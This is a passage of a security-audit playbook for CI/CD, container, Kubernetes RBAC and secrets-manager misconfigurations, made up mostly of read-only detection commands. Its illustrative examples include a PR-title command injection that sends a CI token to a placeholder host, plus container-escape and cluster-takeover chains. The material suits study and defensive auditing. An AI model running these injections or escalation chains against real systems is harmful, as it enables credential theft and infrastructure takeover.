**Generalization.** Highest-value variants: (a) CI runners without `ignore-scripts` *and* with live cloud creds in the environment (the dual condition is the bug); (b) self-hosted runners (no ephemerality -- persistence after one malicious build); (c) `build.rs` / Gradle plugins that download from non-pinned URLs at build time; (d) Dockerfile `RUN curl ... | bash` (pipe-to-shell from a mutable URL); (e) git hooks committed to the repo (`.husky/`, `core.hooksPath`) that run on developer machines. The defense readback to check for: `ignore-scripts=true` in CI `.npmrc`, `--frozen-lockfile`/`npm ci`, hermetic builds (Bazel/Nix), and least-priv runner creds. Cross-reference `~/arsenal/methodology/CONTAINER-LAYER-ATTACK-SPEC.md` for build-layer execution semantics.

---

## V7 -- Container escape / setuid / capability misconfig

**What it is.** A container is configured such that compromising the *app inside* leads to compromising the *host/node*: `--privileged`, added capabilities (`CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_NET_ADMIN`), host namespaces (`hostPID`/`hostNetwork`/`hostIPC`), host-path mounts (`/`, `/var/run/docker.sock`, `/proc`), running as root with no `no-new-privileges`, or setuid binaries baked in the image. The seam: dev builds the image (cares about the app); ops sets the runtime policy (cares about scheduling). The *combination* of "image runs as root + setuid binary present" with "pod has `CAP_SYS_ADMIN` + host mount" is owned by neither, and it converts app-RCE into node-RCE.

**Detection kit.**
```bash
# (a) Static image audit: user, setuid/setgid bins, embedded secrets, dangerous bins
trivy image --scanners vuln,secret,misconfig --format json -o "$OUT/trivy-image-full.json" "$IMAGE"
docker history --no-trunc "$IMAGE" | grep -iE 'USER|chmod|setcap|--privileged'  # build-time hints
# setuid/setgid binaries in the image filesystem:
docker create --name _t "$IMAGE" >/dev/null && docker export _t | tar -tvf - 2>/dev/null \
  | awk '$1 ~ /^[-d]rws|^[-d]...s/ {print}' ; docker rm _t >/dev/null
# Effective USER (root=0 is the amplifier):
docker inspect "$IMAGE" --format '{{.Config.User}}'   # empty/0/root = runs as root

# (b) Dockerfile / compose misconfig (declared)
trivy config "$REPO_DIR" --format json -o "$OUT/trivy-dockerfile.json"
grep -RInE 'privileged: true|cap_add|--privileged|/var/run/docker.sock|securityContext' \
  $(find "$REPO_DIR" -name 'docker-compose*.y*ml' -o -name '*.dockerfile' -o -name 'Dockerfile*') 2>/dev/null

# (c) K8s runtime policy (declared manifests + live; live is read-only get)
trivy k8s --report summary cluster 2>/dev/null      # needs kubeconfig (read-only)
kubectl get pods -A -o json 2>/dev/null | jq -r '
  .items[] | select(
    (.spec.hostPID==true) or (.spec.hostNetwork==true) or (.spec.hostIPC==true) or
    (.spec.containers[].securityContext.privileged==true) or
    (.spec.volumes[]?.hostPath?.path) or
    ((.spec.containers[].securityContext.capabilities.add // []) | index("SYS_ADMIN"))
  ) | "\(.metadata.namespace)/\(.metadata.name): privileged/host/caps"'

# (d) kube-bench (CIS) for node/runtime hardening gaps
kube-bench run --targets node,policies --json 2>/dev/null > "$OUT/kube-bench.json"
```

**Observed-state / readback step.** Proof for a privileged/host-mounted pod is the *live manifest read*: `kubectl get pod <p> -o json` showing `securityContext.privileged: true` or `volumes[].hostPath.path: /` or `hostPID: true`. That is the observed escape primitive -- from inside such a pod, an attacker reaches the node, which is mechanically uncontested. **Live** = the running pod spec contains the dangerous field. **Patched** = PodSecurityStandards/admission (`restricted`/`baseline`) rejects it, or the field is absent. For the *image* leg: `docker inspect --format '{{.Config.User}}'` returning empty/`0` AND a setuid binary present (the `tar` `rws` grep) is the readback. Where you have a *controlled* test cluster, you may demonstrate the actual escape (read the node's `/etc/kubernetes/...` via the host mount) -- but against a target, the read-only manifest showing the primitive *is* the finding; do not break out on infra you do not own.

**Instance example (illustrative).** A `node-exporter`-style DaemonSet runs with `hostPID: true`, `hostNetwork: true`, and a `hostPath` mount of `/`. The app container also runs as root. App-RCE in that pod → read `/host/etc/kubernetes/admin.conf` via the mount → cluster-admin kubeconfig. The dev who wrote the exporter image and the ops engineer who scheduled it each saw only their half. `kubectl get ds -o json` shows all three fields live -- that manifest read is the proof; the escape is mechanical.

**Generalization.** Highest-value variants: (a) `/var/run/docker.sock` mounted into a pod (instant host-root via `docker run -v /:/host`); (b) `CAP_SYS_ADMIN` without `seccomp`/`apparmor` (cgroup-release-agent escape, CVE-2022-0492 class); (c) `CAP_SYS_PTRACE` + shared `hostPID` (attach to host processes); (d) writable `hostPath` of a kubelet/CNI dir; (e) a setuid root binary in the image plus an app that can write it (privesc inside the container as a stepping stone). Cross-reference `~/arsenal/methodology/CONTAINER-LAYER-ATTACK-SPEC.md` for the full layer/capability matrix. Always pair the *image* leg (runs-as-root + setuid) with the *runtime* leg (caps/host) -- the bug is the product, which is exactly the seam.

---

## V8 -- K8s RBAC + serviceaccount-token + privileged-pod chains

**What it is.** Kubernetes RBAC grants that look scoped but compose into cluster takeover: a ServiceAccount with `create pods`/`create pods/exec` (run any image, mount any SA), `get/list secrets` (read all secrets incl. other SAs' tokens), `escalate`/`bind` on roles (grant yourself more), `impersonate` (act as cluster-admin), or `create` on `rolebindings`/`clusterrolebindings`. Plus the auto-mounted SA token in every pod is a bearer credential to the API server. The seam: dev requests "my app needs to read this configmap"; ops grants a slightly-too-broad Role; the SA token in the compromised pod then walks the RBAC graph. The *graph* is owned by no one; each grant looked reasonable alone.

**Detection kit.**
```bash
# All read-only (auth can-i, get, list). NEVER create/apply.
# (a) What can each ServiceAccount do? Enumerate dangerous verbs.
kubectl get clusterrolebindings,rolebindings -A -o json > "$OUT/k8s-bindings.json"
kubectl get clusterroles,roles -A -o json > "$OUT/k8s-roles.json"

# (b) Automated RBAC privesc graphing
# rbac-tool (aquasecurity) -- who-can + policy-rules
rbac-tool who-can create pods 2>/dev/null
rbac-tool who-can '*' secrets 2>/dev/null
rbac-tool policy-rules -e '.*' 2>/dev/null > "$OUT/rbac-rules.txt"
# KubiScan -- risky roles, pods, SAs
kubiscan --all 2>/dev/null > "$OUT/kubiscan.txt"

# (c) Self-assessment from a given SA's perspective (read-only can-i)
for verb in create get list "create pods/exec" impersonate escalate bind; do
  echo -n "$verb -> "; kubectl auth can-i $verb pods --as=system:serviceaccount:default:app-sa 2>/dev/null
done
kubectl auth can-i get secrets --as=system:serviceaccount:default:app-sa -A 2>/dev/null
kubectl auth can-i create clusterrolebindings --as=system:serviceaccount:default:app-sa 2>/dev/null

# (d) Which SAs auto-mount a token AND have broad rights (the exploitable pairing)
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.automountServiceAccountToken!=false) | "\(.metadata.namespace)/\(.spec.serviceAccountName)"' | sort -u > "$OUT/automount-sas.txt"

# (e) Map the dangerous grants
jq -r '.items[] | .roleRef as $r | (.subjects[]? | select(.kind=="ServiceAccount")) as $s |
  "\($s.namespace)/\($s.name) -> \($r.kind)/\($r.name)"' "$OUT/k8s-bindings.json" | sort -u
```

**Observed-state / readback step.** Proof = `kubectl auth can-i <dangerous-verb> --as=system:serviceaccount:<ns>:<sa>` returning `yes`. That is the API server itself confirming the grant -- read-only, authoritative, uncontestable. The strongest chain readback: `auth can-i get secrets --as=<sa> -A` → `yes` means that SA's token reads *every* secret in scope, including other SAs' tokens and any DB/cloud creds stored as secrets. **Live** = `can-i` returns `yes` for `create pods` / `get secrets` / `escalate` / `impersonate` / `create clusterrolebindings`. **Patched** = `no`. You confirm the *grant*; you do not need to actually create a pod or read a secret to prove the chain. Pair with V7: if the SA can `create pods` with no PodSecurity admission, it can schedule a privileged host-mount pod (the can-i `yes` + the absence of a restricting admission policy is the full chain).

**Instance example (illustrative).** `app-sa` in namespace `default` has a Role granting `get,list secrets` (dev asked to read one config secret; ops granted the whole verb on the resource). `kubectl auth can-i get secrets --as=system:serviceaccount:default:app-sa -A` returns `yes`. Among the secrets is `argocd-manager-token` (a cluster-admin SA token). App-RCE → read SA token from `/var/run/secrets/...` → use `get secrets` to read the Argo CD admin token → cluster-admin. Every step is a `can-i yes` or a `get` that already-granted RBAC authorizes; the chain is mechanical from read-only outputs.

**Generalization.** Highest-value RBAC primitives: `create/patch pods` (+ schedule privileged), `pods/exec` (shell into any pod incl. higher-priv ones), `get/list secrets` (token harvesting), `escalate`+`bind` (self-grant), `impersonate` (be anyone), `create clusterrolebindings`, `*` on `*`. Also: `automountServiceAccountToken` left default-true on pods that don't need API access; long-lived SA tokens as Secrets (pre-1.24 style) that don't expire; the `system:anonymous`/`system:unauthenticated` group bound to anything. Cross-reference `~/Desktop/BUGS/INFRA-ADJACENT-TO-SC-PLAYBOOK.md` for the keeper/bot-wallet analogue (a K8s SA *is* the cloud-native bot identity).

---

## V9 -- CI/CD pipeline injection (workflow_run, pwn-request, untrusted PR build, OIDC)

**What it is.** The CI pipeline executes attacker-influenced input at a privilege level the attacker should not have. Shapes: (1) **pwn-request** -- a `pull_request_target` workflow checks out and runs the *PR's* code with *write* token + secrets; (2) **script injection** -- `${{ github.event.pull_request.title }}` (attacker-controlled) interpolated into a `run:` shell step → command injection; (3) **workflow_run / artifact poisoning** -- a trusted workflow consumes an artifact built by an untrusted one; (4) **OIDC over-trust** -- the cloud OIDC trust policy's `sub` condition is too broad, so a fork/branch/PR can assume the deploy role; (5) **cache poisoning** -- an untrusted job writes a cache key a trusted job reads. The seam: dev writes the workflow logic; ops/security sets the org's runner + secret + OIDC policy. The *trust boundary* between "untrusted PR" and "privileged main pipeline" is owned by neither.

**Detection kit.**
```bash
cd "$REPO_DIR"
# (a) The pwn-request smell: pull_request_target + checkout of PR head
grep -RIl 'pull_request_target' .github/workflows/ | while read -r wf; do
  echo "== $wf =="; grep -nE 'pull_request_target|actions/checkout|ref:|github.event.pull_request.head' "$wf"
done

# (b) Script-injection sinks: attacker-controlled context in run: blocks
grep -RInE 'run:.*\$\{\{ *github\.(event|head_ref|ref_name)' .github/workflows/ 2>/dev/null
# Common injectable fields:
grep -RInE '\$\{\{ *github\.event\.(pull_request\.(title|body|head\.ref)|issue\.title|comment\.body|head_commit\.message)' .github/workflows/ 2>/dev/null

# (c) Automated workflow auditing
# actionlint (syntax + some security), zizmor (security-focused, finds injection/pwn-request/artifact)
actionlint -format '{{json .}}' .github/workflows/*.y*ml > "$OUT/actionlint.json" 2>/dev/null
pipx run zizmor .github/workflows/ --format json > "$OUT/zizmor.json" 2>/dev/null
jq -r '.[]?|"\(.ident): \(.locations[0].symbolic.key)"' "$OUT/zizmor.json" 2>/dev/null | sort -u

# (d) Unpinned / mutable action references (supply-chain into CI)
grep -RInE 'uses: [^@]+@(v[0-9]+|main|master|latest)\b' .github/workflows/ 2>/dev/null  # tag, not SHA = mutable
grep -RInE 'uses: [^@]+@[0-9a-f]{40}' .github/workflows/ >/dev/null && echo "some pinned by SHA (good)"

# (e) OIDC trust-policy breadth (the privilege leg) -- read-only IAM get
aws iam list-roles --profile "$AWS_PROFILE" --query 'Roles[?contains(AssumeRolePolicyDocument, `token.actions.githubusercontent.com`)].RoleName' --output text \
 | tr '\t' '\n' | while read -r r; do
   echo "== $r =="
   aws iam get-role --role-name "$r" --profile "$AWS_PROFILE" \
     --query 'Role.AssumeRolePolicyDocument' | jq -r '.. | objects | select(.["token.actions.githubusercontent.com:sub"]?)["token.actions.githubusercontent.com:sub"]'
 done
# A sub like "repo:acme/*:*" or "repo:acme/platform:*" (any ref/PR) is over-broad.

# (f) Self-hosted runner exposure (persistence target) -- repo settings
gh api "repos/$REPO/actions/runners" --jq '.runners[]?|{name,status,labels:[.labels[].name]}' 2>/dev/null
```

**Observed-state / readback step.** For script injection: proof is the workflow file containing an attacker-controlled context value directly inside a `run:` step (grep hit), plus the workflow's trigger making it attacker-reachable (`pull_request`, `issue_comment`, `pull_request_target`). The observed "delta" you can *safely* demonstrate against a target you have a fork of: open a PR whose title is a benign marker like `$(echo INJECTED_$RANDOM)` and observe the rendered log echo the substituted value (proves interpolation) -- never use a payload that exfiltrates or mutates. For OIDC over-trust: proof is `get-role`'s `AssumeRolePolicyDocument` showing a `sub` condition broader than the protected ref (the read output *is* the finding; do not assume the role from an unauthorized context). **Live** = injectable context in a privileged trigger / `sub: repo:org/*:*`. **Patched** = inputs passed via `env:` then referenced as `"$VAR"` (quoted env, the recommended fix), `permissions: read-all` on PR triggers, `sub` pinned to `ref:refs/heads/main`, actions pinned by SHA.

**Instance example (illustrative).** `.github/workflows/label.yml` triggers on `pull_request_target` and has `run: echo "Triaging ${{ github.event.pull_request.title }}"`. An attacker opens a PR titled `"; curl -s $URL/$(cat $GITHUB_TOKEN_FILE) #`. Because `pull_request_target` runs with the base repo's `GITHUB_TOKEN` (write) and any configured secrets, the injection executes with write privilege on the repo. Readback against your own fork: a benign `$(id)`-style marker title renders into the log, proving interpolation -- no secret touched. Finding: repo-write RCE via PR title, chains to V1 (steal the workflow's cloud OIDC token) and V2 (assume the deploy role).

**Generalization.** Highest-value variants: (a) `pull_request_target` + checkout of `head.ref` + `npm ci`/`make` (runs untrusted code with secrets -- the canonical pwn-request, chains to V6); (b) artifact poisoning across `workflow_run` (untrusted build's artifact deserialized/executed by a privileged workflow); (c) cache poisoning (untrusted job seeds a cache key a release job restores); (d) self-hosted runners on public repos (any forked PR runs code on your infra -- persistence); (e) over-broad OIDC `sub` (any branch/PR assumes prod-deploy role). Cross-reference `~/arsenal/methodology/H1-HUNTING-PATTERNS.md` and `~/Desktop/BUGS/INFRA-ADJACENT-TO-SC-PLAYBOOK.md`. The CI runner is the *highest-value identity in the org* (it deploys prod) -- anything that runs attacker code there is critical by default.

---

## V10 -- Secrets-manager / KMS misuse (over-broad read, plaintext-at-rest, key-policy gaps)

**What it is.** The dedicated secret/key infrastructure (AWS Secrets Manager/SSM Parameter Store/KMS, GCP Secret Manager/Cloud KMS, Azure Key Vault, HashiCorp Vault) is configured so the secret it's meant to protect is broadly readable, decryptable by too many principals, stored as plaintext where it shouldn't be, or logged. Shapes: a KMS key policy with `Principal: "*"` or a wide `kms:Decrypt`; a Secrets Manager resource policy granting cross-account/org-wide `GetSecretValue`; SSM `SecureString` whose KMS key is the default (any account principal with `kms:Decrypt` on the default key reads it); a Vault policy with `path "secret/*" { capabilities = ["read"] }`; secrets stored as plaintext SSM `String` (not `SecureString`); secret values echoed into CloudTrail/CloudWatch. The seam: dev "put it in Secrets Manager, it's secure"; ops "manages the KMS keys" -- the *who-can-decrypt* binding is owned by neither.

**Detection kit.**
```bash
# (a) Secrets Manager: enumerate secrets + their RESOURCE POLICIES (who can read) -- read-only
aws secretsmanager list-secrets --profile "$AWS_PROFILE" --query 'SecretList[].Name' --output text \
  | tr '\t' '\n' | while read -r s; do
    pol=$(aws secretsmanager get-resource-policy --secret-id "$s" --profile "$AWS_PROFILE" 2>/dev/null | jq -r '.ResourcePolicy // empty')
    [ -n "$pol" ] && echo "$pol" | jq -e '.. | objects | select(.Principal=="*" or (.Principal.AWS?=="*"))' >/dev/null 2>&1 \
      && echo "WIDE-POLICY: $s"
  done
# (b) KMS: key policies allowing broad Decrypt / wildcard principal
aws kms list-keys --profile "$AWS_PROFILE" --query 'Keys[].KeyId' --output text | tr '\t' '\n' \
  | while read -r k; do
      pol=$(aws kms get-key-policy --key-id "$k" --policy-name default --profile "$AWS_PROFILE" 2>/dev/null | jq -r '.Policy')
      echo "$pol" | jq -e '.Statement[] | select(.Effect=="Allow" and (.Principal=="*" or .Principal.AWS=="*") and (.Action|tostring|test("Decrypt|\\*")))' >/dev/null 2>&1 \
        && echo "WIDE-KMS: $k"
    done
# (c) SSM plaintext-at-rest: parameters stored as String (not SecureString) that look secret
aws ssm describe-parameters --profile "$AWS_PROFILE" \
  --query 'Parameters[?Type==`String`].Name' --output text | tr '\t' '\n' \
  | grep -iE 'pass|secret|key|token|cred|api' && echo "^ plaintext SSM params that look sensitive"

# (d) Prowler dedicated checks
prowler aws -p "$AWS_PROFILE" -M json -o "$OUT/prowler-secrets" \
  --check secretsmanager_secret_unused \
          kms_key_not_publicly_accessible \
          ssm_documents_set_as_public \
          awslambda_function_no_secrets_in_variables

# (e) GCP Secret Manager IAM + KMS bindings
gcloud secrets list --project "$GCP_PROJECT" --format='value(name)' 2>/dev/null | while read -r s; do
  gcloud secrets get-iam-policy "$s" --project "$GCP_PROJECT" --format=json 2>/dev/null \
    | jq -r --arg s "$s" '.bindings[]?|select(.members[]?|test("allUsers|allAuthenticatedUsers|allAuthenticated"))|"PUBLIC-SECRET: \($s) \(.role)"'
done

# (f) HashiCorp Vault: overly-broad policies (where you have a read token)
vault policy list 2>/dev/null | while read -r p; do
  echo "== $p =="; vault policy read "$p" 2>/dev/null | grep -A2 -E 'path "secret/\*"|path "\*"|capabilities.*sudo'
done

# (g) Lambda/ECS env-var secrets (the anti-pattern: secrets as plaintext env)
aws lambda list-functions --profile "$AWS_PROFILE" --query 'Functions[].FunctionName' --output text | tr '\t' '\n' \
  | while read -r fn; do
      aws lambda get-function-configuration --function-name "$fn" --profile "$AWS_PROFILE" \
        --query 'Environment.Variables' --output json 2>/dev/null | grep -iE 'pass|secret|key|token' \
        && echo "^ plaintext secret in env of $fn"
    done
```

**Observed-state / readback step.** Proof is the *policy document read*: `get-resource-policy` / `get-key-policy` / `get-iam-policy` returning a statement with `Principal: "*"` (or cross-account/`allUsers`) on `GetSecretValue`/`Decrypt`. That JSON is the observed over-grant. The stronger, non-mutating confirmation: `aws iam simulate-principal-policy` (or `simulate-custom-policy` with the resource policy) showing that an unintended principal's `kms:Decrypt`/`secretsmanager:GetSecretValue` evaluates `allowed`. For plaintext-at-rest: `describe-parameters` showing `Type: String` (not `SecureString`) for a secret-named param is itself the finding (value stored unencrypted, readable by any `ssm:GetParameter`). **Live** = wide principal in the policy / plaintext type / secret in env. **Patched** = principal scoped to specific role ARNs with conditions, `SecureString` with a CMK whose key policy is scoped, secrets referenced (not inlined) in Lambda/ECS. Do not call `GetSecretValue`/`Decrypt` to "prove" it -- the policy read + simulator is proof; actually reading a secret value you weren't authorized to read crosses from recon to exploitation.

**Instance example (illustrative).** `prod/db/master` is a SecureString SSM param encrypted with the *default* `alias/aws/ssm` KMS key. The default key's policy allows `kms:Decrypt` to the whole account root (`Principal: {AWS: arn:aws:iam::111122223333:root}`). Therefore *any* IAM principal in the account with `ssm:GetParameter` + the (account-wide) `kms:Decrypt` on the default key reads the DB master password -- including the low-priv `app-ci-role` from V2. `simulate-principal-policy` for `app-ci-role` on `ssm:GetParameter` + `kms:Decrypt` against the default key returns `allowed`. The dev believed SecureString = isolated; the default-key sharing means it isn't. Provable from read-only policy + simulator, no secret read.

**Generalization.** Highest-value variants: (a) default KMS key for SecureString/Secrets (account-wide decrypt) -- extremely common; (b) cross-account secret resource policies missing `aws:PrincipalOrgID` condition; (c) GCP secrets bound to `allAuthenticatedUsers` (any Google account); (d) Azure Key Vault with access policies vs RBAC confusion granting broad `get`; (e) Vault policies with `secret/*` read or `sudo`; (f) secrets passed as Lambda/ECS/K8s plaintext env (readable via `describe`/`get`, IMDS, or `/proc/1/environ`); (g) secret values appearing in CloudTrail `RequestParameters`/CloudWatch logs (a logging-the-secret leak, the cloud analogue of V1's CI-log leak). The throughline: the *decrypt grant* is the real ACL on the secret, and it almost always drifts wider than the secret's owner believes.

---

## Cross-vector amplifiers (this surface)

The seam-killshots: a *build-time* credential or *transitive* permission, plus the *run-time* sink it unlocks, equals privilege escalation to infra control. Name pattern: **build→run privilege carry**.

- **V1 + V2 = THE KILLSHOT (build→run privilege carry).** A leaked credential from a build artifact (V1: AKIA in an image layer / OIDC token reachable on a runner) whose *effective* IAM permission (V2: PassRole→admin, or default-KMS decrypt) is broader than intended. Leaked low-priv key + privesc chain = account admin. This is the cloud analogue of upshift's "operator key + signed-tx sink." Proof is two read outputs stitched: `sts get-caller-identity` (whose key) + `simulate-principal-policy` (what that identity can escalate to). If both legs are present, this is Critical with no counterfactual.

- **V5 + V6 + V9 = supply-chain RCE on the deploy identity.** Dependency confusion / typosquat (V5: unclaimed internal name + unpinned resolver) → malicious `postinstall` (V6: runs at build) → on a CI runner that holds prod-deploy OIDC/creds (V9: over-broad `sub` or `pull_request_target`). Attacker-controlled package → build-runner RCE → prod deploy role. Each leg is read-only-provable (404 status, lifecycle-script presence, OIDC `sub` breadth) without ever publishing a package or running an untrusted build against the real runner.

- **V3 + V2 = SSRF→IMDS→privesc.** App SSRF reaches IMDSv1 (V3) → instance-role creds → that role's effective permissions escalate (V2: the instance profile can PassRole or read a privileged secret). The Capital One shape. Proof: SSRF returns the role name (V3 readback) + `simulate-principal-policy` on that role shows the privesc (V2 readback).

- **V8 + V7 = RBAC→privileged-pod→node→cluster.** A ServiceAccount that can `create pods` (V8: `can-i yes`) with no PodSecurity admission can schedule a privileged/host-mounted pod (V7), escaping to the node and then to cluster-admin via the node's kubelet/SA. Proof: `auth can-i create pods --as=<sa>` = yes + absence of a `restricted` admission policy (read-only) + the host-mount primitive being schedulable.

- **V4 + (V3 | V2 | V7) = drift unlocks any other vector.** IaC drift (V4) is the *enabler* layer: a console-added `0.0.0.0/0` rule turns an internal service public (→V3), a console-widened IAM policy creates the privesc (→V2), a console-edited pod spec adds a host mount (→V7). Always run V4 first when the repo audit says "clean" -- the clean declaration is exactly the cover for the drifted reality. The `terraform plan -refresh-only` exit-2 / `driftctl unmanaged` output is the master key that says "audit the live state, not the repo."

- **V10 + V2 = the secret that is the privesc.** A broadly-decryptable secret (V10: default-KMS / wide resource policy) that *contains another identity's static key* (V1-style residue stored in the manager) read by a low-priv role (V2) = lateral movement without ever touching IAM. Proof: simulator shows the low-priv role can decrypt + the secret name implies a higher-priv credential.

---

## Expansion sub-pass hints (specializing HUNT-METHODOLOGY.md Pass 2)

How the universal Pass 2 sub-passes specialize on this surface (the *what to expand into* once a primary hit lands; the 4-pass mechanics live in HUNT-METHODOLOGY.md):

- **2A authority-chain (who can act-as whom).** On cloud: the IAM/RBAC graph. Expand every hit by tracing the *transitive* grant -- `iam:PassRole` targets, `sts:AssumeRole` trust chains, GCP `serviceAccountTokenCreator`/`actAs`, K8s `impersonate`/`escalate`/`bind`, Vault `sudo`. Tool: `cloudsplaining`/`rbac-tool who-can`. The expansion question: "who else can become this identity, and what can *that* identity become?" Walk it until fixpoint (V2, V8).

- **2B secret hygiene (mint→use→discard residue).** For every secret found, expand across *all* its resting places: CI log, image layer, bundle, SSM/Secrets-Manager-at-rest, Lambda/ECS env, Terraform state, K8s Secret object, `/proc/1/environ`. A secret found in one place almost always has a sibling copy in another (the build→run carry). Tool: `trufflehog`/`gitleaks` across repo+image+fs+ci; `aws ssm/secretsmanager` enumeration. The expansion question: "where else does this same value live, and is one of those run-time-readable?" (V1, V10).

- **2C privileged-actor-under-stress (the deploy identity in motion).** The cloud "privileged actor under stress" is the *CI runner mid-deploy* and the *operator mid-incident*. Expand into: what does the pipeline do under a failing deploy (partial apply → drift), under a rerun (cache reuse), under a hotfix (console edit → V4 drift)? What creds are live on the runner *during* the build window (OIDC token, registry push, kubeconfig)? Tool: read workflow YAML + `gh run view --log`. The expansion question: "what privilege is briefly held, and what attacker-influenced code runs while it's held?" (V6, V9).

- **2D shadow surface (the un-IaC'd, the orphaned, the staging twin).** Expand into resources that *exist but no code/audit governs*: `driftctl unmanaged`, orphaned DNS (subdomain takeover), staging/dev environments with prod creds, old EBS snapshots / AMIs / container tags still pullable, dangling LB target groups, abandoned self-hosted runners. Tool: `driftctl`, `subfinder`+`nuclei takeovers`, `aws ec2 describe-snapshots --owner self`. The expansion question: "what is reachable that no review ever covers because it isn't in the repo?" (V3, V4).

- **2E error/telemetry leak (the observability seam).** Expand into what the *monitoring* layer exposes: CloudTrail/CloudWatch logging secret values in `RequestParameters`, `/actuator/env` / `/debug/pprof` / `/metrics` exposing config, verbose CI logs defeating mask, error pages leaking stack traces with internal hostnames/ARNs, Sentry/Datadog with secrets in breadcrumbs. Tool: `nuclei -t exposed-panels,misconfiguration`, `gh run view --log`, log queries. The expansion question: "does the system that watches the system leak the system?" (V1, V3, V10).

---

## Mirror pairs (this surface)

Pass 3 (mirror-invariant) audits these bidirectional pairs. The rule: a config is NOT "clean" without a written `V_in vs V_out` line. On infra, the asymmetries are between the *declared/intended* direction and the *effective/deployed* direction:

- **Declared IaC ↔ deployed reality.** `V_in` = what the `.tf`/manifest says; `V_out` = what `describe-*`/`get -o yaml` returns. Asymmetry = drift (V4). The most common "looks clean" lie.
- **IAM intent ↔ effective (transitive) permission.** `V_in` = the human-readable grant ("read this bucket"); `V_out` = the policy-simulator decision over the full graph. Asymmetry = privesc (V2, V8).
- **Secret encrypted-at-rest ↔ who-can-decrypt.** `V_in` = "it's a SecureString / in Secrets Manager"; `V_out` = the KMS key policy + resource policy principal set. Asymmetry = broad decrypt (V10).
- **Ingress declared-internal ↔ egress/route effective-public.** `V_in` = "behind the VPC"; `V_out` = the external probe / route table / LB listener. Asymmetry = exposure (V3).
- **Build-time secret ↔ run-time artifact.** `V_in` = "the token only lives in CI"; `V_out` = `trivy image --scanners secret` / bundle scan / `docker history`. Asymmetry = leak (V1).
- **Manifest-resolved dependency ↔ lockfile/registry-resolved artifact.** `V_in` = the name+range in `package.json`; `V_out` = what the resolver actually fetches (registry, integrity, version). Asymmetry = confusion/drift (V5).
- **Image-as-built ↔ pod-as-run.** `V_in` = the Dockerfile `USER`/contents; `V_out` = the K8s `securityContext`/caps/host mounts at runtime. Asymmetry = escape (V7).
- **Trusted main pipeline ↔ untrusted PR pipeline.** `V_in` = "CI is internal and trusted"; `V_out` = what a forked PR can make the pipeline execute at what privilege. Asymmetry = injection (V9).

Write the `V_in vs V_out` line for each governed resource. An absence-of-protection bug (the secure side is present elsewhere, missing here) only surfaces by writing both directions.

---

## Pointers to existing arsenal (reference, do not duplicate)

- **`~/Desktop/BUGS/INFRA-ADJACENT-TO-SC-PLAYBOOK.md`** -- primary companion. Relayers, bridges, oracles, sequencer RPCs, indexers, keepers, MPC, bot/keeper-wallet audit (Rule 28). The cloud-IAM analogue of a keeper wallet is a CI OIDC role / K8s ServiceAccount -- read it for the "privileged automation identity" mindset that V2/V8/V9 operationalize.
- **`~/arsenal/methodology/CONTAINER-LAYER-ATTACK-SPEC.md`** -- the full container/image layer + capability matrix backing V1 (layer residue), V6 (build-layer execution), V7 (escape primitives). Read before deep-diving any image-layer or capability finding; do not re-derive the layer semantics here.
- **`~/arsenal/methodology/MULTI-LANG-PATTERNS.md`** -- per-ecosystem resolver and build-tool quirks backing V5/V6 (npm vs PyPI vs Go vs Cargo resolution order, lockfile semantics, build-script hooks). Use for the language-specific confusion/post-install variants.
- **`~/arsenal/methodology/H1-HUNTING-PATTERNS.md`** -- H1 hacktivity patterns; relevant to V3 (exposed-service/subdomain-takeover patterns), V9 (the CI-injection and pwn-request patterns are well-represented in H1 disclosures), and V1 (sourcemap/bundle secret leaks). Cross-reference for known-good disclosure framing.
- **`~/Desktop/BUGS/CRITICAL-HUNT-CHECKLIST.md`** -- §6 (Governance & Upgradeability) and §6c map onto the IAM/RBAC privesc mindset; use its reference-exploit framing for impact quantification on V2/V8/V10.
- **Rule 26 (RPC node namespace exposure)** and **Rule 28 (keeper/bot wallet audit)** in `CLAUDE-rules-infra.md` -- the 5-minute exposure check (V3) and the privileged-automation-identity audit (V2/V8/V9) are the encoded short forms; run them on every infra target before deep work.

Not relevant to this surface (do not reference): the ZK-circuit, MPC-threshold, compiler-bug, SQLi, and differential-fuzzing methodology files, except where a target's secret-management happens to use threshold crypto (then `MPC-THRESHOLD-HUNT.md` applies to the *key-custody* leg only).